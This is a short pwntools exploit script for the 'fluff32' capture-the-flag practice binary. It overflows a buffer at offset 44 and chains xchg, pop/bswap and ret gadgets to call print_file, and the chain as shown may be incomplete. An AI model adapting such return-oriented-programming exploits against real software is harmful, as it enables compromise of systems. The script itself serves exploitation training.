#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './fluff32'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

offset = 44

# analyze questionableGadgets symbol with gdb-pwndbg
# https://www.felixcloutier.com/x86/xchg 
# https://www.felixcloutier.com/x86/bswap
# https://stackoverflow.com/questions/69966389/what-are-assembly-instructions-like-pext-actually-used-for
# https://en.wikipedia.org/wiki/X86_Bit_manipulation_instruction_set
payload = flat({
    offset: [
        0x08048555, # xchg byte ptr [ecx], dl; ret;
        0x08048558, # pop ecx; bswap ecx; ret;
        elf.sym['print_file'],
        rop.find_gadget(["ret"])[0],
        elf.bss()
    ]
})

io.sendlineafter(b'>', payload)
io.interactive()